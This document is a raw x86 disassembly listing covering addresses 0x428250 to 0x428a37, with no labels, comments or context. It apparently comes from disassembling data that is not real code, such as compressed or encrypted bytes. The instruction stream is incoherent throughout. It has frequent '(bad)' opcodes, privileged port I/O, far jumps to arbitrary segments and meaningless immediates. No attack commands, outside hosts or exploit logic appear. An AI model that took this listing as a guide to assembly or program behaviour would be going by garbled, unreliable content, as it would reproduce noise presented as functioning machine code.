  428250:	lods   al,BYTE PTR ds:[esi]
  428251:	out    dx,al
  428252:	cmp    ebp,DWORD PTR ss:[ebp+0x111656ad]
  428259:	out    dx,al
  42825a:	fist   DWORD PTR [eax+0x49]
  42825d:	push   eax
  42825e:	cmp    al,BYTE PTR [eax]
  428260:	and    DWORD PTR [ebp+0x5a5c8c93],ebx
  428266:	adc    DWORD PTR [ebp-0x1e],0xf408a641
  42826d:	cmp    ecx,edx
  42826f:	add    al,0x2d
  428271:	xor    dl,BYTE PTR [edx+0x4]
  428274:	bound  ebp,QWORD PTR [ebx]
  428276:	nop
  428277:	xchg   BYTE PTR [ecx],dl
  428279:	fs add eax,0xa30c7493
  42827f:	mov    ebp,0x6839c1ab
  428284:	push   0x2d
  428286:	adc    BYTE PTR [eax],bh
  428288:	nop
  428289:	aad    0x81
  42828b:	stos   DWORD PTR es:[edi],eax
  42828c:	xor    eax,0x73025f64
  428291:	jmp    0x5bcdda60
  428296:	dec    edx
  428297:	mov    al,0x7c
  428299:	xor    BYTE PTR [edx+eax*4],bl
  42829c:	or     ebp,DWORD PTR [eax+0x614611ab]
  4282a2:	test   al,ah
  4282a4:	adc    al,0x27
  4282a6:	call   0x970def65
  4282ab:	inc    esp
  4282ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4282ad:	xacquire xchg BYTE PTR es:[eax-0x7c],dl
  4282b2:	dec    eax
  4282b3:	xor    DWORD PTR [esi],0x37
  4282b6:	enter  0xc655,0xc8
  4282ba:	(bad)  
  4282bb:	loope  0x4282f5
  4282bd:	or     BYTE PTR [eax+0x53],0x4a
  4282c1:	xchg   edx,eax
  4282c2:	xchg   ebx,eax
  4282c3:	push   ss
  4282c4:	dec    edx
  4282c5:	or     eax,0x56eb00f1
  4282ca:	in     al,dx
  4282cb:	push   ss
  4282cc:	addr16 push edx
  4282ce:	lock or DWORD PTR ds:0x3ed83d8c,ebp
  4282d5:	mov    es,WORD PTR [ecx]
  4282d7:	fsubr  st,st(0)
  4282d9:	sub    esp,DWORD PTR [edx]
  4282db:	push   ebx
  4282dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4282dd:	pop    esi
  4282de:	inc    eax
  4282df:	into   
  4282e0:	jmp    0x68fc3d11
  4282e5:	ins    DWORD PTR es:[edi],dx
  4282e6:	jp     0x4282c1
  4282e8:	inc    esp
  4282e9:	push   ebx
  4282ea:	xchg   edi,eax
  4282eb:	ror    BYTE PTR [eax],cl
  4282ed:	rcr    BYTE PTR [ecx+eax*4+0x2c],cl
  4282f1:	leave  
  4282f2:	fidivr DWORD PTR [esi]
  4282f4:	int    0x15
  4282f6:	jne    0x42830b
  4282f8:	(bad)  
  4282f9:	fdivr  DWORD PTR [ebx]
  4282fb:	jo     0x4282ad
  4282fd:	sbb    edi,esi
  4282ff:	into   
  428300:	sbb    BYTE PTR [esi+0x64380ca0],bl
  428306:	ins    DWORD PTR es:[edi],dx
  428307:	mov    ah,0x54
  428309:	repnz outs dx,BYTE PTR ds:[esi]
  42830b:	dec    esi
  42830c:	cmp    eax,0xbd5fdd3a
  428311:	adc    al,0x57
  428313:	jae    0x42836c
  428315:	sub    cl,BYTE PTR [ebx]
  428317:	xor    dl,ch
  428319:	shl    DWORD PTR [eax+eiz*8+0x6e],1
  42831d:	xchg   edi,eax
  42831e:	cs inc eax
  428320:	repz call 0x43041270
  428326:	mov    ds:0x53c85910,eax
  42832b:	mov    BYTE PTR [edx],bh
  42832d:	aam    0xd2
  42832f:	imul   ecx,DWORD PTR [edi-0x42850c77],0x3a
  428336:	mov    esp,0xb81664a4
  42833b:	sub    BYTE PTR [ecx+ebp*8],cl
  42833e:	dec    edx
  42833f:	(bad)  
  428340:	push   ecx
  428341:	inc    eax
  428342:	push   ebp
  428343:	push   esi
  428344:	add    eax,0x59a74ec1
  428349:	xchg   ecx,eax
  42834a:	mov    bh,0x7b
  42834c:	(bad)  
  42834d:	shl    dl,cl
  42834f:	adc    BYTE PTR [esp+edi*2],bh
  428352:	mov    BYTE PTR gs:[edi-0x3e410989],bh
  428359:	and    eax,0xa3ecda4d
  42835e:	scas   al,BYTE PTR es:[edi]
  42835f:	aas    
  428360:	inc    eax
  428361:	pusha  
  428362:	ins    BYTE PTR es:[edi],dx
  428363:	popf   
  428364:	fidivr DWORD PTR [esi*2-0x2c32813]
  42836b:	xor    eax,0x27ed9675
  428370:	mov    ds:0xeda0efe2,al
  428375:	mov    DWORD PTR [esi],ecx
  428377:	add    DWORD PTR [eax],eax
  428379:	add    BYTE PTR [edi-0xf00dfe],bl
  42837f:	shl    BYTE PTR [edi],1
  428381:	popf   
  428382:	cld    
  428383:	enter  0x1e47,0xf8
  428387:	cmp    DWORD PTR [ebx-0x11],0x40fbfd3f
  42838e:	mov    al,ds:0x49726736
  428393:	inc    eax
  428394:	sub    DWORD PTR [ebx-0x3f],ebx
  428397:	lahf   
  428398:	pop    ebp
  428399:	add    al,0xd1
  42839b:	rcr    DWORD PTR [eax],0x84
  42839e:	ret    0xb4e
  4283a1:	mov    ebp,DWORD PTR [ecx+0x61]
  4283a4:	imul   esi,DWORD PTR [edi],0xcf06a942
  4283aa:	and    eax,0x491e96f6
  4283af:	out    dx,al
  4283b0:	mov    al,0x43
  4283b2:	sub    ah,BYTE PTR [eax+0x6e]
  4283b5:	inc    esp
  4283b6:	push   0x9
  4283b8:	sub    eax,0xf2e02869
  4283bd:	add    al,0xf5
  4283bf:	lds    edx,FWORD PTR [ebx]
  4283c1:	sbb    bh,dl
  4283c3:	aaa    
  4283c4:	popa   
  4283c5:	out    dx,eax
  4283c6:	sbb    DWORD PTR [edi+0x6b],esi
  4283c9:	aad    0x9a
  4283cb:	retf   
  4283cc:	loopne 0x4283ff
  4283ce:	and    esp,edi
  4283d0:	or     al,0x8a
  4283d2:	push   ss
  4283d3:	jmp    0x4283af
  4283d5:	mov    eax,0xb224f52f
  4283da:	or     dh,BYTE PTR [esi+0x2004beeb]
  4283e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4283e1:	ins    DWORD PTR es:[edi],dx
  4283e2:	xor    eax,0x48462b80
  4283e7:	push   ds
  4283e8:	ds inc ebp
  4283ea:	(bad)  
  4283eb:	aam    0x22
  4283ed:	retfw  
  4283ef:	add    eax,0xbf4f466b
  4283f4:	dec    esp
  4283f5:	test   BYTE PTR [eax-0x3d233775],0x11
  4283fc:	and    esp,DWORD PTR [esi+0x54655039]
  428402:	dec    ebp
  428403:	lea    ebx,[eax+0x6b53441a]
  428409:	call   0x12ac:0x804f501d
  428410:	xchg   edx,eax
  428411:	js     0x428463
  428413:	mov    ebp,0x301a5046
  428418:	mov    es,eax
  42841a:	mov    al,0x20
  42841c:	mov    ch,BYTE PTR ds:0xce2de57d
  428422:	divps  xmm4,XMMWORD PTR [ecx]
  428425:	test   BYTE PTR [eax+eiz*1],ah
  428428:	mov    eax,0x16285b0e
  42842d:	dec    esi
  42842e:	sbb    ecx,DWORD PTR [eax+edi*4+0x3d26752f]
  428435:	xchg   edx,esp
  428437:	xor    cl,al
  428439:	add    esp,DWORD PTR [ecx+edi*8+0xa1c3042]
  428440:	mov    ds:0x6c153b0e,eax
  428445:	cmc    
  428446:	mov    esi,0x898e72b5
  42844b:	cmp    al,BYTE PTR ds:0x6ce05999
  428451:	jle    0x4283f5
  428453:	imul   BYTE PTR [ecx-0x18]
  428456:	outs   dx,DWORD PTR ds:[esi]
  428457:	adc    BYTE PTR [eax],dl
  428459:	xor    cl,BYTE PTR [ecx]
  42845b:	ret    0x31de
  42845e:	int3   
  42845f:	cdq    
  428460:	xchg   ecx,eax
  428461:	fisubr DWORD PTR [eax-0x183f9241]
  428467:	fild   WORD PTR ds:0xb37d4402
  42846d:	push   ecx
  42846e:	loope  0x428495
  428470:	mov    al,ds:0x18b66581
  428475:	lahf   
  428476:	cmp    cl,BYTE PTR [edx+0x2e]
  428479:	sti    
  42847a:	cmp    al,0x16
  42847c:	cmp    ebx,DWORD PTR [edi]
  42847e:	div    BYTE PTR [ebx]
  428480:	int    0xf5
  428482:	pop    ds
  428483:	repnz clc 
  428485:	sub    DWORD PTR [eax-0x38],ebx
  428488:	popf   
  428489:	adc    DWORD PTR [ecx],ebx
  42848b:	jle    0x4284fd
  42848d:	loope  0x4284a3
  42848f:	and    dh,dl
  428491:	repnz ficom WORD PTR [eax+0x69]
  428495:	outs   dx,DWORD PTR ds:[esi]
  428496:	dec    ecx
  428497:	leave  
  428498:	add    al,0x58
  42849a:	xchg   DWORD PTR [ecx],eax
  42849c:	and    al,BYTE PTR [ecx+esi*1]
  42849f:	inc    esi
  4284a0:	les    ebp,FWORD PTR [eax-0x53]
  4284a3:	jmp    0x9f47:0x28b3484c
  4284aa:	jge    0x42848e
  4284ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4284ad:	pop    esi
  4284ae:	hlt    
  4284af:	std    
  4284b0:	pop    edi
  4284b1:	jg     0x42848e
  4284b3:	cmovle esi,DWORD PTR [esi-0x61]
  4284b7:	adc    al,0xae
  4284b9:	jg     0x428494
  4284bb:	sahf   
  4284bc:	jo     0x4284cd
  4284be:	add    BYTE PTR [eax],al
  4284c0:	scas   al,BYTE PTR es:[edi]
  4284c1:	(bad)  
  4284c3:	nop
  4284c4:	stos   BYTE PTR es:[edi],al
  4284c5:	stos   BYTE PTR es:[edi],al
  4284c6:	fidiv  DWORD PTR [edi]
  4284c8:	std    
  4284c9:	(bad)  
  4284ca:	aas    
  4284cb:	jle    0x4284bc
  4284cd:	fcmovu st,st(2)
  4284cf:	retf   0xe6cf
  4284d2:	aam    0x66
  4284d4:	imul   esp,DWORD PTR [ebx-0x30dd24b8],0x5a5d92a3
  4284de:	rcl    bh,0xd1
  4284e1:	xor    DWORD PTR [ecx+0x22032fc6],ebx
  4284e7:	xor    ecx,DWORD PTR [edx+0x59f29790]
  4284ed:	jae    0x4284e2
  4284ef:	sar    edi,1
  4284f1:	scas   eax,DWORD PTR es:[edi]
  4284f2:	adc    eax,0x6819ea5b
  4284f7:	mov    edx,0x1663cccb
  4284fc:	les    eax,FWORD PTR [esi+0x59]
  4284ff:	ja     0x42853e
  428501:	push   edi
  428502:	sbb    cl,ah
  428504:	adc    BYTE PTR [esi],ah
  428506:	cmp    edx,edi
  428508:	ret    
  428509:	xor    eax,0x1baf0a35
  42850e:	cmp    al,0x40
  428510:	xor    eax,0xf65094f5
  428515:	mov    ecx,0x1ce8ab9d
  42851a:	lods   al,BYTE PTR ds:[esi]
  42851b:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  42851d:	ja     0x42856a
  42851f:	dec    ecx
  428520:	(bad)  
  428521:	pushf  
  428522:	cmp    DWORD PTR [ecx-0x10],esi
  428525:	mov    al,cs:0x6aea15f6
  42852b:	test   BYTE PTR [edx],bh
  42852d:	aam    0x8
  42852f:	shl    BYTE PTR cs:[ebp-0x7d],0x52
  428534:	ins    DWORD PTR es:[edi],dx
  428535:	mov    eax,ds:0x210800e6
  42853a:	popa   
  42853b:	xchg   BYTE PTR [esi+eiz*4-0x137c9278],dl
  428542:	and    bh,BYTE PTR [edi+ecx*1-0x1d3fedf8]
  428549:	push   ecx
  42854a:	sub    BYTE PTR [eax-0x52bff5a0],ch
  428550:	adc    al,0x74
  428552:	bnd jo 0x4285b6
  428555:	and    al,0x5e
  428557:	push   esp
  428558:	jmp    0x4285bf
  42855a:	adc    DWORD PTR [ebx+0x29af2605],ebx
  428560:	cmp    dh,BYTE PTR [ecx]
  428562:	jb     0x4284f9
  428564:	pushf  
  428565:	xchg   ebx,eax
  428566:	shr    BYTE PTR [ebx+0x39],cl
  428569:	add    eax,0x372c5129
  42856e:	or     DWORD PTR [eax],edi
  428570:	xor    ah,bl
  428572:	fadd   st,st(1)
  428574:	push   ebp
  428575:	sbb    dl,BYTE PTR [esi+0x64]
  428578:	retf   0x867d
  42857b:	mov    al,ds:0x68275e08
  428580:	add    dl,BYTE PTR [ecx-0x76cb185c]
  428586:	gs dec eax
  428588:	int3   
  428589:	cli    
  42858a:	xchg   edx,eax
  42858b:	mov    bl,0xf0
  42858d:	mov    eax,ds:0x5bd0450c
  428592:	mov    eax,ds:0xc72a3871
  428597:	nop
  428598:	jbe    0x428570
  42859a:	xchg   ebp,eax
  42859b:	sub    al,0x5
  42859d:	and    ah,0x64
  4285a0:	loope  0x4285ee
  4285a2:	(bad)  
  4285a3:	cli    
  4285a4:	stos   DWORD PTR es:[edi],eax
  4285a5:	imul   esp,DWORD PTR [ebp-0x29],0x7f
  4285a9:	clc    
  4285aa:	cmp    eax,0xf94b329d
  4285af:	rcr    BYTE PTR [edx+0x4c],0xe6
  4285b3:	popf   
  4285b4:	mov    ecx,0x9e923afc
  4285b9:	mov    esp,0x75bb2b9d
  4285be:	push   ss
  4285bf:	fdivrp st(7),st
  4285c1:	mov    BYTE PTR [edi-0x7a6e429d],bh
  4285c7:	sbb    bl,BYTE PTR [esi+ebp*2+0x25]
  4285cb:	lods   al,BYTE PTR ds:[esi]
  4285cc:	jo     0x428598
  4285ce:	popa   
  4285cf:	pop    ecx
  4285d0:	aad    0x9a
  4285d2:	inc    edx
  4285d3:	test   cl,0xd9
  4285d6:	rcr    BYTE PTR [ebx-0x4e],0x82
  4285da:	sub    eax,0x2a319f3d
  4285df:	lock xchg edi,eax
  4285e1:	popa   
  4285e2:	imul   edx,DWORD PTR [ebx+ecx*1-0x76],0x5e
  4285e7:	sti    
  4285e8:	sar    BYTE PTR [edi-0x7],cl
  4285eb:	mov    bl,bh
  4285ed:	stc    
  4285ee:	out    0x6b,eax
  4285f0:	repz (bad) [edi]
  4285f3:	mov    dl,0xe8
  4285f5:	jl     0x4285b8
  4285f7:	fist   DWORD PTR [ebx]
  4285f9:	xchg   edx,eax
  4285fa:	push   es
  4285fb:	pop    esp
  4285fc:	mov    dh,0x59
  4285fe:	push   0x50
  428600:	sahf   
  428601:	stc    
  428602:	mov    WORD PTR [ebx+0x7bd1fdb7],fs
  428608:	aas    
  428609:	stc    
  42860a:	rcl    BYTE PTR [ebp+eiz*8-0x2d3333e7],cl
  428611:	imul   esi,DWORD PTR [eax+0x32],0x6347a51c
  428618:	jnp    0x428679
  42861a:	cmp    dl,BYTE PTR [edi]
  42861c:	add    edx,eax
  42861e:	xor    DWORD PTR [ebx-0x1b],0x9
  428622:	sbb    BYTE PTR [eax+0x3c],dl
  428625:	add    BYTE PTR [ebp+esi*8+0x15],dh
  428629:	jmp    0x1833:0xb389572c
  428630:	into   
  428631:	fsqrt  
  428633:	popf   
  428634:	add    dl,BYTE PTR [edx+ebp*1-0x3fb22a5c]
  42863b:	inc    ebp
  42863c:	xor    eax,0x51962ec
  428641:	xlat   BYTE PTR ds:[ebx]
  428642:	sbb    DWORD PTR [bx+si],ecx
  428645:	inc    eax
  428646:	(bad)  
  428648:	dec    esi
  428649:	xchg   esi,eax
  42864a:	mov    cl,0x28
  42864c:	icebp  
  42864d:	add    BYTE PTR [ebp-0x60],dh
  428650:	pop    ds
  428651:	pop    eax
  428652:	jns    0x428635
  428654:	mov    ah,0xe9
  428656:	dec    ecx
  428657:	mov    ecx,0x1402ba0f
  42865c:	xor    ah,dh
  42865e:	ret    
  42865f:	shl    dl,cl
  428661:	imul   edi,DWORD PTR [edi+0x4135b249],0x79
  428668:	shl    BYTE PTR [ebx-0x529fe69a],0xbf
  42866f:	sub    BYTE PTR [esi],dl
  428671:	nop
  428672:	xor    eax,0x5aca0f57
  428677:	ss in  eax,dx
  428679:	sbb    al,0x74
  42867b:	scas   al,BYTE PTR es:[edi]
  42867c:	hlt    
  42867d:	loopne 0x428616
  42867f:	push   cs
  428680:	cli    
  428681:	fnstcw WORD PTR [ebx+0x3e29a8b4]
  428687:	add    eax,0x81d807cc
  42868c:	popa   
  42868d:	sbb    dl,BYTE PTR [edx+0x1a]
  428690:	arpl   WORD PTR [edx-0x172ae7bd],ax
  428696:	push   edx
  428697:	mov    ah,BYTE PTR [edx+0x44529519]
  42869d:	dec    edi
  42869e:	test   DWORD PTR [edx-0x48],edi
  4286a1:	sub    BYTE PTR [esi],ah
  4286a3:	test   al,0xeb
  4286a5:	out    dx,al
  4286a6:	sbb    DWORD PTR [esi],edx
  4286a8:	xchg   esi,eax
  4286a9:	adc    al,0x9b
  4286ab:	stos   DWORD PTR es:[edi],eax
  4286ac:	(bad)  
  4286ad:	xchg   esi,eax
  4286ae:	rcr    BYTE PTR [esi-0x43fbe794],cl
  4286b4:	sub    al,BYTE PTR [esi-0x6a058059]
  4286ba:	mov    eax,0xa8b5d0fc
  4286bf:	daa    
  4286c0:	and    edx,DWORD PTR [eax]
  4286c2:	add    DWORD PTR [ecx],esi
  4286c4:	push   bp
  4286c6:	lock and eax,0x7491d7f5
  4286cc:	cwde   
  4286cd:	ja     0x4286b0
  4286cf:	dec    edx
  4286d0:	push   0xffffffd3
  4286d2:	outs   dx,BYTE PTR ds:[esi]
  4286d3:	mov    esi,0x76d3dc7f
  4286d8:	jmp    0xde39b7c4
  4286dd:	mov    eax,ds:0x80cf3a5d
  4286e2:	cmp    DWORD PTR [edx],eax
  4286e4:	jne    0x4286c7
  4286e6:	sbb    BYTE PTR [esi+0x37],0x1e
  4286ea:	jl     0x428742
  4286ec:	out    dx,eax
  4286ed:	dec    ecx
  4286ee:	cmp    bh,ah
  4286f0:	push   eax
  4286f1:	add    eax,0x78075f0f
  4286f6:	mov    ds:0x84daebb0,eax
  4286fb:	mov    eax,ds:0x329b47f8
  428700:	fidiv  DWORD PTR [esi]
  428702:	and    bl,BYTE PTR [ecx]
  428704:	xchg   ebp,eax
  428705:	cmp    eax,0x9c5e9804
  42870a:	mov    esi,0x7eaf39ff
  42870f:	jmp    0x360905d3
  428714:	(bad)  
  428715:	iret   
  428716:	ficomp WORD PTR [esi+eiz*4]
  428719:	dec    edi
  42871a:	sbb    dl,bh
  42871c:	mov    edi,0x51a4f6c
  428721:	add    BYTE PTR [eax],al
  428723:	cmp    edi,DWORD PTR [ebx]
  428725:	cmp    esi,edx
  428727:	aad    0xcf
  428729:	mov    edi,0xb53a9d31
  42872e:	cmc    
  42872f:	(bad)  
  428730:	jnp    0x428720
  428732:	cmp    ebp,edi
  428734:	jge    0x42874f
  428736:	cwde   
  428737:	xor    BYTE PTR [ecx],cl
  428739:	imul   ebp,DWORD PTR [eax+0x23b568ad],0xf3ab7032
  428743:	add    BYTE PTR [ecx+0x22],dl
  428746:	jg     0x4286da
  428748:	mov    esi,0x584cb415
  42874d:	sub    DWORD PTR [esi+0x2b8a9771],edi
  428753:	inc    edx
  428754:	imul   ebx,DWORD PTR [ebx+0x40ccbf94],0xffffffd6
  42875b:	aam    0x62
  42875d:	test   al,0x3d
  42875f:	cwde   
  428760:	cmp    al,0x68
  428762:	das    
  428763:	sbb    BYTE PTR [edx-0x741e12e6],0x10
  42876a:	mov    dh,0x46
  42876c:	xchg   edi,eax
  42876d:	mov    al,ds:0xcd0eb4a9
  428772:	das    
  428773:	mov    ebp,0x952945e0
  428778:	jnp    0x428700
  42877a:	and    ebx,ebp
  42877c:	mov    bl,BYTE PTR [edi]
  42877e:	hlt    
  42877f:	icebp  
  428780:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428781:	mov    ch,0xeb
  428783:	adc    al,bl
  428785:	mov    eax,ds:0xe173cdcf
  42878a:	mov    edx,0x105e96b2
  42878f:	mov    edx,es
  428791:	retf   
  428792:	push   edx
  428793:	push   0x5e
  428795:	out    0xc9,eax
  428797:	(bad)  
  428798:	ret    0xca0a
  42879b:	in     al,dx
  42879c:	mov    ebp,0xad53e66c
  4287a1:	mov    dh,0x80
  4287a3:	enter  0x96f7,0xd2
  4287a7:	and    al,0x80
  4287a9:	sub    ebp,esi
  4287ab:	enter  0x2029,0x3d
  4287af:	mov    al,es:0x3f654a0c
  4287b5:	stos   DWORD PTR es:[edi],eax
  4287b6:	sub    cl,ah
  4287b8:	retf   0xd486
  4287bb:	sub    DWORD PTR [ebx],ecx
  4287bd:	push   es
  4287be:	cmp    al,bh
  4287c0:	into   
  4287c1:	retf   
  4287c2:	push   eax
  4287c3:	lds    esp,FWORD PTR [ecx+0x14541cd6]
  4287c9:	pop    ebp
  4287ca:	stc    
  4287cb:	jge    0x4287c3
  4287cd:	inc    ebp
  4287ce:	test   al,0x60
  4287d0:	mov    ch,0x7a
  4287d2:	or     al,0x9d
  4287d4:	cmp    al,0xac
  4287d6:	jmp    0x706aac31
  4287db:	sub    BYTE PTR [esi+0x6e],dl
  4287de:	in     al,dx
  4287df:	sbb    BYTE PTR [esi+0x3e3c70aa],bh
  4287e5:	pop    es
  4287e6:	jmp    0x3d8656fe
  4287eb:	pop    edx
  4287ec:	(bad)
  4287ef:	test   al,0xcf
  4287f1:	fwait
  4287f2:	jae    0x4287f5
  4287f4:	cli    
  4287f5:	in     al,dx
  4287f6:	cli    
  4287f7:	pop    eax
  4287f8:	call   0xf1ac1ec0
  4287fd:	mov    ss,ebp
  4287ff:	jmp    0xb309:0x9cccf33b
  428806:	sar    DWORD PTR [eax],cl
  428808:	sahf   
  428809:	mov    ebx,0xfe17ecf7
  42880e:	jb     0x42886f
  428810:	sbb    BYTE PTR [esp+esi*8-0x6],bh
  428814:	fyl2xp1 
  428816:	jmp    0x79de:0x73fbf04
  42881d:	test   dl,bl
  42881f:	and    esp,edx
  428821:	inc    ecx
  428822:	cmp    ebp,DWORD PTR [edi+esi*8]
  428825:	sub    DWORD PTR [ecx*1-0x77b19d5d],ecx
  42882c:	dec    ebp
  42882d:	push   esp
  42882e:	pop    edx
  42882f:	jns    0x4287fc
  428831:	xor    al,0x6d
  428833:	popf   
  428834:	fidivr DWORD PTR [edi*2-0x1c8da04]
  42883b:	stos   DWORD PTR es:[edi],eax
  42883c:	inc    ebx
  42883d:	dec    edi
  42883e:	movq   mm1,mm6
  428841:	and    edx,edi
  428843:	stc    
  428844:	daa    
  428845:	xchg   ebp,eax
  428846:	jmp    0x4288a7
  428848:	mov    dh,0x27
  42884a:	add    eax,0xa5b0b006
  42884f:	lahf   
  428850:	cld    
  428851:	aaa    
  428852:	scas   eax,DWORD PTR es:[edi]
  428853:	jp     0x428845
  428855:	scas   al,BYTE PTR es:[edi]
  428856:	dec    edi
  428857:	popf   
  428858:	cld    
  428859:	(bad)  
  42885a:	jnp    0x42889b
  42885c:	jge    0x428844
  42885e:	pop    ebp
  42885f:	adc    DWORD PTR [eax+0x4924255c],ebp
  428865:	loopne 0x4288c2
  428867:	sub    BYTE PTR [ebx],0xf
  42886a:	inc    edi
  42886b:	mov    WORD PTR [eax+ebp*8+0x72],gs
  42886f:	mov    dl,0x14
  428871:	pop    ds
  428872:	mov    dl,0xc5
  428874:	sahf   
  428875:	pop    ecx
  428876:	add    DWORD PTR [eax+0x66],eax
  428879:	push   esi
  42887a:	in     al,0xba
  42887c:	add    al,0xfd
  42887e:	push   esp
  42887f:	xchg   esp,eax
  428880:	inc    ebx
  428881:	lahf   
  428882:	das    
  428883:	sub    ah,BYTE PTR [ebp-0x3b]
  428886:	push   0xd
  428888:	adc    eax,DWORD PTR [eax-0x74]
  42888b:	sbb    BYTE PTR [ebx+0x70],bl
  42888e:	sbb    edx,DWORD PTR [eax]
  428890:	inc    edx
  428891:	test   DWORD PTR [ebx+ebp*8],ebp
  428894:	shl    dh,0x71
  428897:	rol    bl,1
  428899:	sub    eax,0x37769e76
  42889e:	pop    edx
  42889f:	aas    
  4288a0:	push   ebp
  4288a1:	ret    0xf0d
  4288a4:	enter  0x990e,0x30
  4288a8:	cdq    
  4288a9:	inc    esp
  4288aa:	xor    DWORD PTR [ebx],eax
  4288ac:	dec    ecx
  4288ad:	jne    0x428902
  4288af:	inc    edx
  4288b0:	push   esp
  4288b1:	jl     0x428873
  4288b3:	xor    cl,BYTE PTR [edx+0x6c]
  4288b6:	stc    
  4288b7:	cli    
  4288b8:	or     al,0x6d
  4288ba:	ins    DWORD PTR es:[edi],dx
  4288bb:	es mov bl,0xf8
  4288be:	in     al,0x75
  4288c0:	push   0xffffffb0
  4288c2:	and    ecx,DWORD PTR [edi-0x7e0f3a14]
  4288c8:	push   esi
  4288c9:	jns    0x4288ad
  4288cb:	fadd   DWORD PTR [ecx+0x7c]
  4288ce:	stos   DWORD PTR es:[edi],eax
  4288cf:	pop    ecx
  4288d0:	mov    WORD PTR [edi+edx*8],?
  4288d3:	out    0xa4,al
  4288d5:	push   0xffffff84
  4288d7:	push   ss
  4288d8:	xor    edi,DWORD PTR [eax+0x5f]
  4288db:	imul   ebp,DWORD PTR [ecx-0x69e6ff50],0xa4dfb462
  4288e5:	retf   0x7a87
  4288e8:	(bad)  [esi]
  4288ea:	jmp    0xa364:0x8056e786
  4288f1:	(bad)  
  4288f2:	pushf  
  4288f3:	and    BYTE PTR [ebp+eax*4-0x18],0x83
  4288f8:	push   0x7decaca0
  4288fd:	add    eax,0xa464109b
  428902:	lods   al,BYTE PTR ds:[esi]
  428903:	mov    bl,0xb
  428905:	mov    edx,0x53a10a0c
  42890a:	add    BYTE PTR [eax-0x2fd87d0c],0xda
  428911:	push   es
  428912:	mov    dh,0x33
  428914:	ins    DWORD PTR es:[edi],dx
  428915:	xor    al,0xea
  428917:	pushf  
  428918:	dec    edx
  428919:	cli    
  42891a:	xchg   ecx,eax
  42891b:	mov    edx,0x3ce77cea
  428920:	jmp    0xeac7:0x5ab8c230
  428927:	(bad)  
  428928:	mov    esi,0x8cddb01
  42892d:	jecxz  0x428952
  42892f:	add    DWORD PTR [ebx-0x619974a7],esi
  428935:	push   es
  428936:	pop    esi
  428937:	xchg   esi,eax
  428938:	jns    0x42894c
  42893a:	sub    BYTE PTR [ebp+0x3c],al
  42893d:	fcmovu st,st(0)
  42893f:	inc    esp
  428940:	ss xchg edi,eax
  428942:	mov    cl,0xa4
  428944:	hlt    
  428945:	shl    DWORD PTR [ebp+0x939786],1
  42894b:	hlt    
  42894c:	sbb    DWORD PTR [ecx+eax*1+0xf283066],edi
  428953:	cs (bad) 
  428955:	sub    al,0xe6
  428957:	pop    edx
  428958:	push   es
  428959:	adc    DWORD PTR [ecx-0x3f599c6],esi
  42895f:	jp     0x428910
  428961:	cmp    eax,0xc431de24
  428966:	mov    BYTE PTR [ebx+0xa],ch
  428969:	xchg   BYTE PTR [eax],ah
  42896b:	xchg   esi,eax
  42896c:	jecxz  0x4288fd
  42896e:	xor    DWORD PTR [ebx+0x23],ebp
  428971:	daa    
  428972:	jmp    0x4288ff
  428974:	pop    ebx
  428975:	lahf   
  428976:	mov    ebp,0xfe7b1cd8
  42897b:	cmc    
  42897c:	aas    
  42897d:	cmc    
  42897e:	cld    
  42897f:	push   edi
  428980:	cmp    al,0xfb
  428982:	add    edi,DWORD PTR [edi]
  428984:	sti    
  428985:	sbb    BYTE PTR [ebx],0xdb
  428988:	pop    edi
  428989:	pop    ds
  42898a:	clc    
  42898b:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  42898d:	dec    edi
  42898e:	lahf   
  42898f:	jle    0x428963
  428991:	js     0x428995
  428993:	dec    edi
  428994:	dec    eax
  428995:	sub    eax,esi
  428997:	mov    ds:0xf854a56d,eax
  42899c:	pop    ebx
  42899d:	(bad)  
  42899e:	idiv   BYTE PTR [edi-0x6]
  4289a1:	fild   QWORD PTR [esi]
  4289a3:	in     eax,dx
  4289a4:	ins    BYTE PTR es:[edi],dx
  4289a5:	std    
  4289a6:	adc    bh,BYTE PTR [ebx-0x31]
  4289a9:	cmp    BYTE PTR ds:[edx-0x32],dh
  4289ad:	stos   DWORD PTR es:[edi],eax
  4289ae:	push   ss
  4289af:	scas   al,BYTE PTR es:[edi]
  4289b0:	sbb    al,0xd8
  4289b2:	jnp    0x428a17
  4289b4:	sbb    BYTE PTR [esi+0x48],cl
  4289b7:	(bad)  
  4289b8:	mov    cl,0xaf
  4289ba:	outs   dx,BYTE PTR ds:[esi]
  4289bb:	cmp    al,al
  4289bd:	and    ch,BYTE PTR [edx+0x61]
  4289c0:	mov    dh,bh
  4289c2:	int    0x6e
  4289c4:	jo     0x4289ba
  4289c6:	bnd jl 0x4289b8
  4289c9:	(bad)  
  4289ca:	packsswb mm4,QWORD PTR [esi+eiz*1-0x63]
  4289cf:	pop    edx
  4289d0:	push   esp
  4289d1:	lea    ebx,ds:0x6eb447d8
  4289d7:	pop    ss
  4289d8:	rcl    ecx,cl
  4289da:	sbb    esp,ebp
  4289dc:	ds jmp 0x428a0d
  4289df:	int3   
  4289e0:	jmp    0x6890:0xb512c8f3
  4289e7:	sahf   
  4289e8:	xchg   ebp,eax
  4289e9:	adc    BYTE PTR [esp+eiz*4+0x23263f8],dh
  4289f0:	adc    DWORD PTR [ebp+0x2d],ecx
  4289f3:	sub    bl,BYTE PTR [edi-0x7bb11683]
  4289f9:	in     eax,dx
  4289fa:	and    al,0x9d
  4289fc:	imul   ebx,DWORD PTR [eax+0x40],0x37
  428a00:	cmp    DWORD PTR [edx+0x34b485db],0xd2424653
  428a0a:	test   eax,0xd4211282
  428a0f:	and    dl,BYTE PTR [ecx-0x55]
  428a12:	js     0x428a59
  428a14:	jbe    0x4289f6
  428a16:	xor    BYTE PTR [edx-0x79edf099],al
  428a1c:	mov    ebx,DWORD PTR [esi]
  428a1e:	lods   eax,DWORD PTR ds:[esi]
  428a1f:	int3   
  428a20:	xchg   ecx,eax
  428a21:	mov    ebp,0x90324920
  428a26:	push   0xffffff80
  428a28:	add    eax,0xece039d8
  428a2d:	nop
  428a2e:	fwait
  428a2f:	add    dh,dl
  428a31:	cdq    
  428a32:	jnp    0x428a20
  428a34:	aad    0x2d
  428a36:	pop    ss
  428a37:	push   ecx
